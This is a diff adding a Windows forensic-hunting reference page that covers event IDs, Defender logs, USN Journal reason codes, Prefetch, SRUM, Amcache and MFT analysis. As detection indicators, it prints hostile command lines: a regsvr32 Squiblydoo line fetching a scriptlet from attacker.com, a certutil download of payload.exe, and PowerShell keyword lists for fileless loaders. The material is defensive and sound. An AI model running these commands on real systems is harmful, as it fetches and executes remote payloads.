+            <tr><td><code>0x0010</code></td><td>PROCESS_VM_READ</td><td>Reading memory arrays — external cheat reading player coords.</td></tr>
+            <tr><td><code>0x0008</code></td><td>PROCESS_VM_OPERATION</td><td>VirtualAllocEx — allocating space inside target for payload.</td></tr>
+            <tr><td><code>0x0020</code></td><td>PROCESS_VM_WRITE</td><td>WriteProcessMemory — injecting bytes (DLL injection stage 2).</td></tr>
+            <tr><td><code>0x0800</code></td><td>PROCESS_SUSPEND_RESUME</td><td>SuspendThread + SetThreadContext — thread hijacking.</td></tr>
+            <tr><td><code>0x0040</code></td><td>PROCESS_DUP_HANDLE</td><td>Handle duplication — credential theft bypass for LSASS.</td></tr>
+          </table>
+          <h3>Sysmon ID 8 — CreateRemoteThread</h3>
+          <p>The final injection stage. After allocating memory (ID 10 with VM_WRITE) the attacker calls <code>CreateRemoteThread</code> to execute the injected payload inside the victim process.</p>
+          <div class="alert alert-sus"><strong>Hunt Rule:</strong> SourceImage = any suspicious process → TargetImage = <code>explorer.exe</code>, <code>notepad.exe</code>, <code>winlogon.exe</code>, or a game client. Any legitimate app creating remote threads into another app is an injection attempt.</div>
+        </div>
+      </div>
+
+      <!-- 10: FILELESS -->
+      <div id="ev-fileless" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-code"></i> Module 10: PowerShell &amp; Fileless Execution</h2>
+          <span class="eid eid-warn">Event ID 4104</span><span class="eid eid-info">Event ID 4688</span>
+          <span class="log-path">Apps &amp; Services &gt; Microsoft &gt; Windows &gt; PowerShell &gt; Operational (4104)</span>
+          <h3>Event ID 4104 — Script Block Logging Keywords</h3>
+          <table>
+            <tr><th>Keyword in ScriptBlockText</th><th>Forensic Meaning</th></tr>
+            <tr><td><code>FromBase64String</code></td><td>Attacker unpacking a hidden encoded payload.</td></tr>
+            <tr><td><code>[System.Runtime.InteropServices.Marshal]::Copy</code></td><td>C# reflection copying bytes directly into memory.</td></tr>
+            <tr><td><code>VirtualAlloc</code> / <code>WriteProcessMemory</code></td><td>PowerShell performing memory injection — no .exe needed.</td></tr>
+            <tr><td><code>System.Reflection.Assembly.Load</code></td><td>Loading a .NET DLL from memory — AppDomain injection.</td></tr>
+            <tr><td><code>Invoke-Expression</code> / <code>IEX</code></td><td>Executing a string as code — almost always evasion.</td></tr>
+            <tr><td><code>DownloadString</code> / <code>WebClient</code></td><td>Pulling second-stage payload from C2 server in memory.</td></tr>
+            <tr><td><code>-nop -w hidden -enc</code></td><td>PowerShell launched non-interactively with encoded command — fileless malware canonical pattern.</td></tr>
+          </table>
+          <div class="alert alert-info"><strong>4104 captures code AFTER deobfuscation.</strong> Even if the attacker used triple-encoded base64 + XOR, the script block logger sees the final decoded intent.</div>
+        </div>
+      </div>
+
+      <!-- 11: DEFENDER -->
+      <div id="ev-defender" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-shield-virus"></i> Module 11: Windows Defender Logs</h2>
+          <span class="log-path">Apps &amp; Services &gt; Microsoft &gt; Windows &gt; Windows Defender &gt; Operational</span>
+          <p>Windows Defender writes rich operational logs under its own channel. These are separate from the Security log and contain detection details, scan results, and tampering alerts.</p>
+          <table>
+            <tr><th>Event ID</th><th>Meaning</th><th>Forensic Value</th></tr>
+            <tr><td><span class="eid eid-danger">1006</span></td><td>Malware detected</td><td>Contains threat name, file path, SHA1 hash, and action taken.</td></tr>
+            <tr><td><span class="eid eid-danger">1007</span></td><td>Malware action performed (quarantine/remove)</td><td>Confirms Defender acted — check if quarantine was bypassed.</td></tr>
+            <tr><td><span class="eid eid-danger">1008</span></td><td>Action on malware failed</td><td>Defender tried and failed — file may be locked by a running cheat/RAT.</td></tr>
+            <tr><td><span class="eid eid-warn">1116</span></td><td>Malware or PUA detected</td><td>Real-time protection hit. Contains full threat details with file path.</td></tr>
+            <tr><td><span class="eid eid-warn">1117</span></td><td>Action taken on detected threat</td><td>Quarantine confirmation or removal. If missing after 1116 = evasion.</td></tr>
+            <tr><td><span class="eid eid-danger">3002</span></td><td>Real-time protection failed</td><td>RTP encountered an error — often caused by cheat software tampering with MsMpEng.</td></tr>
+            <tr><td><span class="eid eid-danger">5001</span></td><td>Real-time protection disabled</td><td>Critical. Someone or something turned off real-time scanning.</td></tr>
+            <tr><td><span class="eid eid-danger">5004</span></td><td>Real-time protection config changed</td><td>Exclusion added — attackers add their cheat/payload folder to exclusions to bypass Defender.</td></tr>
+            <tr><td><span class="eid eid-danger">5007</span></td><td>Defender settings changed</td><td>Check for exclusion paths, disabled scans, or engine updates.</td></tr>
+            <tr><td><span class="eid eid-ok">2000</span></td><td>Signature update started</td><td>Normal update cycle baseline.</td></tr>
+            <tr><td><span class="eid eid-ok">2001</span></td><td>Signature update succeeded</td><td>Baseline — alerts if absent for &gt;24h may indicate update blocking.</td></tr>
+          </table>
+          <h3>Detecting Exclusion Abuse (Event 5004 / 5007)</h3>
+          <p>Open Event ID <strong>5004</strong> or <strong>5007</strong> and look at the <code>New value</code> field. If an exclusion path like <code>C:\Users\Username\AppData\Roaming\cheat\</code> or <code>C:\ProgramData\gamehack\</code> appears, the attacker added their payload folder to bypass real-time scanning.</p>
+          <div class="alert alert-sus"><strong>Critical Chain:</strong> 5001 (RTP disabled) → 1006 (malware detected but RTP was off, detected by manual scan later) → 1008 (action failed) = active, running malware evading Defender.</div>
+          <h3>PowerShell — Query Defender Logs</h3>
+          <div class="cmd-block"><code>Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | Where-Object {$_.Id -in @(1006,1116,5001,5004,5007,3002)} | Select-Object TimeCreated,Id,Message | Format-List</code></div>
+        </div>
+      </div>
+
+      <!-- 12: PERSISTENCE -->
+      <div id="ev-persistence" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-redo"></i> Module 12: Persistence &amp; Scheduled Tasks</h2>
+          <span class="eid eid-warn">Event ID 4698</span><span class="eid eid-info">Event ID 5861</span>
+          <span class="log-path">Windows Logs &gt; Security (4698) | WMI-Activity &gt; Operational (5861)</span>
+          <table>
+            <tr><th>Event</th><th>Meaning</th><th>Hunt Focus</th></tr>
+            <tr><td>4698</td><td>Scheduled Task Created</td><td>Check <code>&lt;Command&gt;</code> and <code>&lt;Arguments&gt;</code> in the XML data.</td></tr>
+            <tr><td>4699</td><td>Scheduled Task Deleted</td><td>Task deleted after single use = disposable persistence (run-once loaders).</td></tr>
+            <tr><td>4700/4701</td><td>Task Enabled / Disabled</td><td>Attacker disabling security-related tasks (Windows Update, Defender updates).</td></tr>
+            <tr><td>5861</td><td>WMI Subscription created</td><td>Fileless persistence — survives reboots with no files on disk.</td></tr>
+          </table>
+          <h3>Task XML Forensics</h3>
+          <ul class="step-list">
+            <li>Open 4698, click <em>Details &gt; XML View</em>. Find <code>&lt;Command&gt;</code> and <code>&lt;Arguments&gt;</code>.</li>
+            <li>Legitimate tasks: command points to signed binaries in <code>System32</code> or <code>Program Files</code>.</li>
+            <li>Malicious tasks: command = <code>wscript.exe</code> loading a <code>.vbs</code> from <code>C:\ProgramData\</code>, or <code>powershell.exe -enc JABz...</code>.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 13: NETWORK -->
+      <div id="ev-network" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-network-wired"></i> Module 13: Network &amp; C2 Beacons</h2>
+          <span class="eid eid-info">Sysmon ID 22</span><span class="eid eid-warn">Sysmon ID 3</span>
+          <span class="log-path">Apps &amp; Services &gt; Microsoft &gt; Windows &gt; Sysmon &gt; Operational</span>
+          <table>
+            <tr><th>Sysmon ID</th><th>Meaning</th><th>Hunt Focus</th></tr>
+            <tr><td>22</td><td>DNS Query</td><td>Which process resolved which domain. <code>notepad.exe</code> resolving <code>randomsub.ngrok.io</code> = C2.</td></tr>
+            <tr><td>3</td><td>Network Connection</td><td>Full Source/Dest IP+Port + owning process. Beaconing = same IP every N minutes.</td></tr>
+          </table>
+          <div class="alert alert-sus"><strong>Process Hollowing Detection:</strong> If <code>notepad.exe</code>, <code>calc.exe</code>, or <code>svchost.exe</code> makes an outbound TCP 443 connection to an unknown IP — the legitimate process shell has been hollowed and replaced with a C2 implant.</div>
+        </div>
+      </div>
+
+      <!-- 14: CRASHES -->
+      <div id="ev-crashes" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-bug"></i> Module 14: Crashes &amp; Bad Pointers</h2>
+          <span class="eid eid-danger">Event ID 1000</span><span class="eid eid-info">Event ID 1001</span>
+          <span class="log-path">Windows Logs &gt; Application</span>
+          <table>
+            <tr><th>Exception Code</th><th>Technical Meaning</th><th>Forensic Implication</th></tr>
+            <tr><td><code>0xc0000005</code></td><td>Access Violation</td><td>#1 indicator of a failed injection. Foreign DLL accessed invalid/null pointer.</td></tr>
+            <tr><td><code>0xc0000374</code></td><td>Heap Corruption</td><td>Injected payload mismanaged memory allocation inside target process.</td></tr>
+            <tr><td><code>0xc0000409</code></td><td>Stack Buffer Overrun</td><td>Exploitation attempt — payload too large, GS stack cookie triggered.</td></tr>
+            <tr><td><code>0x40000015</code></td><td>Fatal App Exit</td><td>Forced exit — anti-cheat or EDR detected and killed the process.</td></tr>
+          </table>
+          <div class="alert alert-sus"><strong>Smoking Gun:</strong> <code>Discord.exe</code> crashes with 0xc0000005 and the Faulting Module = <code>C:\Users\Name\AppData\Local\Temp\hook.dll</code>. You just found the exact cheat/malware DLL that failed to inject.</div>
+        </div>
+      </div>
+
+    </main>
+  </div>
+</div>
+<!-- End Event Viewer Tab -->
+
+<!-- ══════════════ USN JOURNAL TAB ══════════════ -->
+<div id="tab-usn" class="tab-pane">
+  <div class="card">
+    <h2><i class="fas fa-database"></i> USN Journal Overview</h2>
+    <p>The <strong>Update Sequence Number (USN) Journal</strong> (<code>$UsnJrnl:$J</code>) is an NTFS metadata structure that records every file-system change on a volume — file creation, deletion, rename, attribute changes — with a 64-bit monotonically increasing sequence number and a <strong>UTC timestamp</strong>.</p>
+    <div class="alert alert-info"><strong>All USN Journal timestamps are UTC.</strong> The <code>TimeStamp</code> field in each record represents the exact UTC time the file-system event occurred at the kernel level.</div>
+    <h3>Tools</h3>
+    <a href="https://github.com/spokwn/JournalTrace/releases" target="_blank" class="tool-link"><i class="fas fa-download"></i> JournalTrace (GUI)</a>
+    <a href="https://download.ericzimmermanstools.com/net9/MFTECmd.zip" target="_blank" class="tool-link"><i class="fas fa-download"></i> MFTECmd.exe (Eric Zimmerman)</a>
+    <a href="https://download.ericzimmermanstools.com/net9/TimelineExplorer.zip" target="_blank" class="tool-link"><i class="fas fa-stream"></i> TimelineExplorer (CSV Viewer)</a>
+    <h3>Extraction Commands</h3>
+    <p>Run elevated (Administrator). Replace <code>C:</code> with any NTFS drive letter:</p>
+    <div class="cmd-block"><code>MFTECmd.exe -f "C:\$Extend\$UsnJrnl:$J" --csv . --csvf FullJournal.csv</code></div>
+    <p>For other drives (D:, E:, etc.):</p>
+    <div class="cmd-block"><code>MFTECmd.exe -f "D:\$Extend\$UsnJrnl:$J" --csv . --csvf FullJournal_D.csv</code></div>
+    <p>Open the resulting CSV in <strong>TimelineExplorer</strong> for sorting, filtering, and highlighting.</p>
+  </div>
+
+  <div class="card">
+    <h2><i class="fas fa-list"></i> USN Reason Codes — Complete Reference</h2>
+    <p>Each record has a bitmask <code>Reason</code> field. Multiple reasons can be OR'd together in a single record. The final record for any file change will always include <code>CLOSE</code>.</p>
+    <table>
+      <tr><th>Reason Flag</th><th>Hex Value</th><th>What It Means</th><th>Forensic Significance</th></tr>
+      <tr><td><code>FILE_CREATE</code></td><td>0x00000100</td><td>A new file or directory was created.</td><td>Payload dropped. Look for .exe, .dll, .ps1, .vbs, .bat in TEMP, AppData, ProgramData, or root of drive.</td></tr>
+      <tr><td><code>FILE_DELETE</code></td><td>0x00000200</td><td>File or directory was deleted.</td><td>Evidence deletion. Malware cleaning up after execution. Check if Prefetch, Amcache, or logs were deleted.</td></tr>
+      <tr><td><code>DATA_OVERWRITE</code></td><td>0x00000001</td><td>Data in the file was overwritten.</td><td>Encryption in-place (ransomware), log tampering, or payload update.</td></tr>
+      <tr><td><code>DATA_EXTEND</code></td><td>0x00000002</td><td>File data was appended / extended.</td><td>Staged download, file being written progressively (dropper writing payload).</td></tr>
+      <tr><td><code>DATA_TRUNCATE</code></td><td>0x00000004</td><td>File was truncated (shrunken).</td><td>Log file zeroing: attacker truncating event logs or evidence files.</td></tr>
+      <tr><td><code>NAMED_DATA_OVERWRITE</code></td><td>0x00000010</td><td>Named data stream overwritten.</td><td>Alternate Data Stream (ADS) manipulation — hiding payloads in ADS of innocent files.</td></tr>
+      <tr><td><code>NAMED_DATA_EXTEND</code></td><td>0x00000020</td><td>Named data stream extended.</td><td>ADS payload being written — ZoneIdentifier or hidden executable stream.</td></tr>
+      <tr><td><code>FILE_RENAME_OLD_NAME</code></td><td>0x00001000</td><td>File was renamed (old name record).</td><td>Malware renaming itself to masquerade as svchost, explorer, etc.</td></tr>
+      <tr><td><code>FILE_RENAME_NEW_NAME</code></td><td>0x00002000</td><td>File was renamed (new name record).</td><td>Paired with OLD_NAME — track the full rename chain to catch masquerading.</td></tr>
+      <tr><td><code>EA_CHANGE</code></td><td>0x00000400</td><td>Extended Attributes changed.</td><td>Rare in modern malware, but rootkits use EA to store hidden config data.</td></tr>
+      <tr><td><code>SECURITY_CHANGE</code></td><td>0x00000800</td><td>File security descriptor changed (ACL/permissions).</td><td>Privilege escalation artifacts — attacker granting themselves full control of a system file.</td></tr>
+      <tr><td><code>BASIC_INFO_CHANGE</code></td><td>0x00008000</td><td>File attributes or timestamps changed.</td><td>Timestomping: <code>BASIC_INFO_CHANGE</code> without file content change = timestamp manipulation only.</td></tr>
+      <tr><td><code>HARD_LINK_CHANGE</code></td><td>0x00010000</td><td>Hard link added or removed.</td><td>DLL planting via hard links to trusted locations.</td></tr>
+      <tr><td><code>COMPRESSION_CHANGE</code></td><td>0x00020000</td><td>Compression state changed.</td><td>Rarely malicious alone, but used to reduce footprint of dropped payloads.</td></tr>
+      <tr><td><code>ENCRYPTION_CHANGE</code></td><td>0x00040000</td><td>EFS encryption state changed.</td><td>Ransomware or insider threat encrypting files with EFS to deny access.</td></tr>
+      <tr><td><code>OBJECT_ID_CHANGE</code></td><td>0x00080000</td><td>Object ID changed.</td><td>Anti-forensic: changing object IDs to break file tracking.</td></tr>
+      <tr><td><code>REPARSE_POINT_CHANGE</code></td><td>0x00100000</td><td>Reparse point (junction/symlink) changed.</td><td>Symlink attacks for privilege escalation or redirecting security tools.</td></tr>
+      <tr><td><code>STREAM_CHANGE</code></td><td>0x00200000</td><td>Named stream added/removed.</td><td>ADS manipulation — same category as NAMED_DATA_*.</td></tr>
+      <tr><td><code>TRANSACTED_CHANGE</code></td><td>0x00400000</td><td>Change made inside a TxF transaction.</td><td>Transactional NTFS abuse — write malicious file inside transaction, visible only to own process.</td></tr>
+      <tr><td><code>INTEGRITY_CHANGE</code></td><td>0x00800000</td><td>Integrity level changed.</td><td>Tampering with file integrity labels used by protected processes.</td></tr>
+      <tr><td><code>CLOSE</code></td><td>0x80000000</td><td>File handle was closed.</td><td>Terminal record. The final reason in any change sequence. Used to determine completion time.</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <h2><i class="fas fa-search"></i> USN Journal Forensic Hunt Scenarios</h2>
+    <h3>Scenario 1: Finding a Dropped Payload</h3>
+    <p>Filter CSV for <code>Reason</code> containing <code>FILE_CREATE</code> + <code>CLOSE</code>. Sort by timestamp. Look for <code>.exe</code>, <code>.dll</code>, <code>.sys</code>, <code>.ps1</code>, <code>.vbs</code>, <code>.bat</code> in:</p>
+    <ul class="step-list">
+      <li><code>C:\Users\*\AppData\Local\Temp\</code></li>
+      <li><code>C:\ProgramData\</code></li>
+      <li><code>C:\Users\Public\</code></li>
+      <li><code>C:\Windows\Temp\</code></li>
+      <li>Drive root: <code>C:\*.exe</code></li>
+    </ul>
+    <h3>Scenario 2: Timestomping Detection</h3>
+    <p>Filter for <code>BASIC_INFO_CHANGE</code> without a preceding <code>DATA_OVERWRITE</code> or <code>DATA_EXTEND</code>. The file's content did not change but its metadata did — this is pure timestamp manipulation. Cross-reference with MFT <code>$STANDARD_INFORMATION</code> vs <code>$FILE_NAME</code> attribute timestamps.</p>
+    <h3>Scenario 3: Anti-Forensic Cleanup</h3>
+    <p>Filter for <code>FILE_DELETE</code> in <code>C:\Windows\System32\winevt\Logs\</code>, <code>C:\Windows\Prefetch\</code>, or <code>C:\Windows\AppCompat\</code>. Deletion of these artifacts is direct evidence of evidence destruction.</p>
+  </div>
+</div>
+
+<!-- ══════════════ PREFETCH TAB ══════════════ -->
+<div id="tab-prefetch" class="tab-pane">
+  <div class="card">
+    <h2><i class="fas fa-bolt"></i> Prefetch Overview</h2>
+    <p>Windows Prefetch (<code>C:\Windows\Prefetch\*.pf</code>) records evidence of execution. Each <code>.pf</code> file stores the executable name, a hash of its path, up to <strong>8 last-run timestamps</strong> (Win10+), run count, and all files/directories loaded during the first 10 seconds of execution. This means even if the executable is deleted, its Prefetch entry proves it ran.</p>
+    <div class="alert alert-info"><strong>Prefetch timestamps are stored in UTC</strong> (Windows FILETIME format, 100-nanosecond intervals since January 1, 1601). Tools like WinPrefetchView display them in local time — always note the UTC offset when documenting evidence.</div>
+    <h3>Tools</h3>
+    <a href="https://www.nirsoft.net/utils/winprefetchview-x64.zip" target="_blank" class="tool-link"><i class="fas fa-download"></i> WinPrefetchView (NirSoft)</a>
+    <a href="https://download.ericzimmermanstools.com/net9/TimelineExplorer.zip" target="_blank" class="tool-link"><i class="fas fa-stream"></i> TimelineExplorer</a>
+    <h3>What to Look For</h3>
+    <ul class="step-list">
+      <li>The <strong>last 8 run timestamps</strong> — shows frequency of execution and when cheats/malware were last active.</li>
+      <li><strong>Run count</strong> — a tool run once vs 200 times tells a very different story.</li>
+      <li><strong>Files and directories referenced</strong> — reveals what the executable accessed, including config files, DLLs it loaded, and target directories.</li>
+      <li><strong>Volume serial number</strong> — identifies which drive the executable ran from (useful for USB execution).</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2><i class="fas fa-microscope"></i> Critical Prefetch Entries — Deep Analysis</h2>
+
+    <h3>CONHOST.EXE — Console Host</h3>
+    <p><strong>Normal:</strong> <code>conhost.exe</code> always runs as a child of a console application — it hosts the console window. It is spawned automatically by <code>cmd.exe</code>, <code>powershell.exe</code>, etc.</p>
+    <div class="alert alert-sus"><strong>SUS:</strong> If Prefetch shows <code>CONHOST.EXE</code> was run at odd hours (3AM, during logoff) or ran far more frequently than normal user activity would explain, a background console application (cheat launcher, C2 implant script) was running hidden.</div>
+    <p>Check the <strong>files loaded</strong> inside the Prefetch entry — if conhost references DLLs from <code>AppData\Temp</code> or loads unusual <code>.dll</code> files, those are the injected modules.</p>
+
+    <h3>CONSENT.EXE — UAC Elevation Dialog</h3>
+    <p><strong>Normal:</strong> <code>consent.exe</code> runs once per UAC prompt. It appears when an application requests elevation.</p>
+    <div class="alert alert-sus"><strong>SUS:</strong> If Prefetch shows <code>CONSENT.EXE</code> ran many times in a short window, or at times when the user was not at the machine, something was repeatedly requesting admin elevation — automated malware or a cheat loader bypassing UAC repeatedly.</div>
+    <p>Correlate timestamps with <code>4688</code> (process creation) events to see what requested elevation each time.</p>
+
+    <h3>CURL.EXE — Command-Line Downloader</h3>
+    <p><strong>Normal use:</strong> Developers use curl for API testing. It is not a standard user tool.</p>
+    <div class="alert alert-sus"><strong>SUS:</strong> <code>CURL.EXE</code> in Prefetch means someone downloaded a file from the internet via the command line. Check the <strong>files referenced</strong> section for any downloaded output files. Correlate with Sysmon ID 3 (network connections) at the same timestamp to recover the URL and destination IP.</div>
+    <p>Cheat loaders frequently use curl or PowerShell <code>Invoke-WebRequest</code> to stage second-phase payloads from a C2 server.</p>
+
+    <h3>RUNDLL32.EXE — DLL Execution Host</h3>
+    <p><strong>Normal:</strong> Legitimate use includes Control Panel applets, screensavers, and Windows setup routines.</p>
+    <div class="alert alert-sus"><strong>SUS Patterns:</strong>
+      <ul style="margin:.5rem 0 .5rem 1.5rem;">
+        <li>Rundll32 running from <code>C:\Users\*\AppData\</code> instead of <code>System32</code>.</li>
+        <li>Referencing a DLL with a random name (<code>xkl39a.dll</code>).</li>
+        <li>Referenced files include network connections (Sysmon ID 3) — rundll32 should not make outbound connections.</li>
+        <li>High run count with referenced files in <code>TEMP</code> — shellcode loader pattern.</li>
+      </ul>
     </div>
+    <p>Check the DLL path in the referenced files. Submit the hash to VirusTotal. Look up the DLL in Amcache for first-seen timestamp.</p>
 
-    <script>
-        function switchTab(tabId) {
-            // Hide all tab content
-            const panes = document.querySelectorAll('.tab-pane');
-            panes.forEach(pane => pane.classList.remove('active'));
-            
-            // Remove active state from all buttons
-            const buttons = document.querySelectorAll('.tab-btn');
-            buttons.forEach(btn => btn.classList.remove('active'));
-            
-            // Show selected tab content
-            document.getElementById(tabId).classList.add('active');
-            
-            // Set active state on clicked button
-            event.currentTarget.classList.add('active');
-            
-            // Scroll main content to top smoothly
-            document.querySelector('.main-content').scrollTo({ top: 0, behavior: 'smooth' });
+    <h3>REGSVR32.EXE — COM DLL Registration</h3>
+    <p><strong>Normal:</strong> Used to register COM/OLE DLL components. Usually runs once during software install.</p>
+    <div class="alert alert-sus"><strong>Squiblydoo / AppLocker Bypass:</strong> <code>regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll</code> — fetches and executes a COM scriptlet from the internet. Bypasses AppLocker and Software Restriction Policies entirely. Prefetch will show <code>REGSVR32.EXE</code> with <code>SCROBJ.DLL</code> in the referenced files list.</div>
+
+    <h3>MSHTA.EXE — HTML Application Host</h3>
+    <p>Executes <code>.hta</code> files (HTML Applications). These are full-trust HTML/JS/VBScript apps.</p>
+    <div class="alert alert-sus"><strong>SUS:</strong> Prefetch shows <code>MSHTA.EXE</code> running in environments where HTA files are not used. Often spawned by Office macros or phishing emails. Referenced files may include <code>.hta</code> files from Temp or AppData.</div>
+
+    <h3>WSCRIPT.EXE / CSCRIPT.EXE — Script Host</h3>
+    <p>Windows Script Host for <code>.vbs</code> and <code>.js</code> files.</p>
+    <div class="alert alert-sus"><strong>SUS:</strong> Referenced files in <code>WSCRIPT.EXE</code> Prefetch pointing to <code>.vbs</code> or <code>.js</code> scripts in <code>AppData</code>, <code>ProgramData</code>, or attached to Office temp files = macro-delivered script payload.</div>
+
+    <h3>POWERSHELL.EXE / POWERSHELL_ISE.EXE</h3>
+    <p>PowerShell execution leaves Prefetch evidence even for <code>-NonInteractive -WindowStyle Hidden</code> runs.</p>
+    <div class="alert alert-sus"><strong>SUS:</strong> High run count at off-hours. Referenced files showing <code>System.Management.Automation.dll</code> loaded from an unusual path = modified/custom PowerShell host for evasion.</div>
+
+    <h3>CERTUTIL.EXE — Certificate Utility (LOLBin)</h3>
+    <p>Built-in Windows tool. Legitimate use: manage certificates.</p>
+    <div class="alert alert-sus"><strong>SUS:</strong> Attackers use <code>certutil -decode</code> to decode base64-encoded payloads, or <code>certutil -urlcache -split -f http://... payload.exe</code> to download files while bypassing proxy restrictions. If Prefetch shows certutil with Temp files in the referenced list, a payload was decoded or downloaded.</div>
+
+    <h3>BITSADMIN.EXE — Background Transfer</h3>
+    <div class="alert alert-sus"><strong>SUS:</strong> Used to download files in background transfers, often to persist a downloader that survives reboots. Prefetch will show it ran; correlate with BITS job logs in <code>Microsoft-Windows-Bits-Client/Operational</code>.</div>
+
+    <h3>SCHTASKS.EXE / AT.EXE — Task Schedulers</h3>
+    <div class="alert alert-sus"><strong>SUS:</strong> Prefetch for <code>SCHTASKS.EXE</code> + referenced parameter files from <code>Temp</code> or <code>AppData</code> = persistence being installed. Correlate timestamp with Event ID 4698 (scheduled task created).</div>
+
+    <h3>NET.EXE / NET1.EXE — Network Commands</h3>
+    <div class="alert alert-sus"><strong>SUS:</strong> Used for user management (<code>net user /add</code>), share enumeration (<code>net share</code>), and lateral movement. Prefetch proves execution even if command history was cleared.</div>
+
+    <h3>MIMIKATZ.EXE / Renamed Variants</h3>
+    <p>Credential harvesting tool. Often renamed to avoid signature detection.</p>
+    <div class="alert alert-sus"><strong>SUS:</strong> Even if renamed to <code>svchost.exe</code> or <code>explorer.exe</code>, the Prefetch hash is based on the <em>original executable path</em>. If the filename in Prefetch doesn't match the parent folder (e.g., <code>SVCHOST.EXE-ABC12345.pf</code> but launched from <code>C:\Users\Name\Desktop\</code> instead of <code>System32</code>), it's a renamed tool.</div>
+
+    <h3>CHEAT / HACK TOOL INDICATORS IN PREFETCH</h3>
+    <p>Specific executables known to appear in Prefetch during cheat/hack activity:</p>
+    <table>
+      <tr><th>Executable Name Pattern</th><th>Significance</th></tr>
+      <tr><td><code>INJECTOR*.EXE</code></td><td>DLL injector — loads cheat DLL into game process memory.</td></tr>
+      <tr><td><code>LOADER*.EXE</code></td><td>Cheat loader — fetches and stages the cheat DLL from C2.</td></tr>
+      <tr><td><code>KDMAPPER*.EXE</code></td><td>Manual kernel driver mapper — loads unsigned drivers without SCM registration.</td></tr>
+      <tr><td><code>ENABLETEST*.EXE</code></td><td>Enables Windows Test Signing mode for unsigned driver loading.</td></tr>
+      <tr><td><code>EXPLOITDB*.EXE</code></td><td>Kernel exploit runner — used for BYOVD attack chain.</td></tr>
+      <tr><td>Any exe in <code>%TEMP%</code> or random GUID folders</td><td>Staged payload — downloaded, executed, then deleted. Prefetch persists the evidence.</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══════════════ SRUM TAB ══════════════ -->
+<div id="tab-srum" class="tab-pane">
+  <div class="card">
+    <h2><i class="fas fa-chart-bar"></i> SRUM Analysis (System Resource Usage Monitor)</h2>
+    <p>The <strong>System Resource Usage Monitor (SRUM)</strong> is a power-forensic artifact located at <code>C:\Windows\System32\sru\SRUDB.dat</code>. It records application resource usage over 30-60 days, including CPU cycles, data sent/received (Bytes Sent/Received), and energy usage. Even if an executable is deleted and its Prefetch is wiped, SRUM often maintains the record of its historical network and CPU impact.</p>
+    
+    <h3>Key Tools</h3>
+    <a href="https://download.ericzimmermanstools.com/SrumECmd.zip" target="_blank" class="tool-link"><i class="fas fa-download"></i> SrumECmd (Eric Zimmerman)</a>
+    
+    <h3>Extraction Command</h3>
+    <div class="cmd-block"><code>SrumECmd.exe -f "C:\Windows\System32\sru\SRUDB.dat" --csv .</code></div>
+    
+    <h3>Forensic Significance</h3>
+    <table>
+      <tr><th>Field</th><th>Forensic Value</th></tr>
+      <tr><td><code>AppId</code></td><td>The name of the executable. Great for finding renamed malware that had high network usage.</td></tr>
+      <tr><td><code>UserId</code></td><td>The user account that ran the app.</td></tr>
+      <tr><td><code>Bytes Sent / Received</code></td><td>Critical for identifying data exfiltration. If <code>notepad.exe</code> sent 500MB of data, it was not being used for notes.</td></tr>
+      <tr><td><code>Network Interface</code></td><td>Shows if the data was sent via Wi-Fi, Ethernet, or a VPN/Virtual adapter.</td></tr>
+      <tr><td><code>Cycle Time</code></td><td>CPU impact. High cycles for a "background" app suggests crypto-mining or heavy encryption activity.</td></tr>
+    </table>
+    <div class="alert alert-warn"><strong>Note:</strong> SRUM records are typically written to the database every 60 minutes. Very recent activity might not be in the <code>SRUDB.dat</code> until the next flush.</div>
+  </div>
+</div>
+
+<!-- ══════════════ AMCACHE TAB ══════════════ -->
+<div id="tab-amcache" class="tab-pane">
+  <div class="card">
+    <h2><i class="fas fa-archive"></i> Amcache Analysis</h2>
+    <p><strong>Amcache.hve</strong> is a registry hive located at <code>C:\Windows\AppCompat\Programs\Amcache.hve</code>. It is a gold mine for tracking the <strong>first time</strong> an executable was seen on the system, its cryptographic hash (SHA1), and its full path.</p>
+    
+    <h3>Key Tools</h3>
+    <a href="https://download.ericzimmermanstools.com/AmcacheParser.zip" target="_blank" class="tool-link"><i class="fas fa-download"></i> AmcacheParser (Eric Zimmerman)</a>
+    
+    <h3>Extraction Command</h3>
+    <div class="cmd-block"><code>AmcacheParser.exe -f "C:\Windows\AppCompat\Programs\Amcache.hve" --csv .</code></div>
+    
+    <h3>Visualizing Evidence</h3>
+    <ul class="step-list">
+      <li><strong>SHA1 Hashes:</strong> Amcache records the SHA1 of almost every executable run. Perfect for VirusTotal lookups of deleted files.</li>
+      <li><strong>File Path:</strong> Proves where the file was executed from (e.g., a hidden folder in <code>System32</code>).</li>
+      <li><strong>First Run Timestamp:</strong> The <code>FileCreationTime</code> in Amcache often correlates to the moment the malware was first deployed.</li>
+      <li><strong>Original Filename:</strong> Even if the attacker renamed <code>mimikatz.exe</code> to <code>calc.exe</code>, the internal metadata in Amcache may reveal the truth.</li>
+    </ul>
+  </div>
+</div>
+
+<!-- ══════════════ MFT TAB ══════════════ -->
+<div id="tab-mft" class="tab-pane">
+  <div class="card">
+    <h2><i class="fas fa-folder-open"></i> MFT (Master File Table)</h2>
+    <p>The <strong>Master File Table (MFT)</strong> is the "index" of an NTFS volume. Every file and directory has at least one entry in the MFT. It contains timestamps, file size, and location on the physical disk.</p>
+    
+    <h3>Key Tools</h3>
+    <a href="https://download.ericzimmermanstools.com/net9/MFTECmd.zip" target="_blank" class="tool-link"><i class="fas fa-download"></i> MFTECmd (Eric Zimmerman)</a>
+    
+    <h3>Extraction Command</h3>
+    <div class="cmd-block"><code>MFTECmd.exe -f "C:\$MFT" --csv . --csvf MFT.csv</code></div>
+    
+    <h3>Indepth Analysis</h3>
+    <p>By parsing the MFT, you can find <strong>deleted files</strong> (if their MFT record has not been overwritten yet). You are looking for the four primary timestamps: <strong>Modified, Accessed, Created, and MFT Entry Modified (MACE)</strong>.</p>
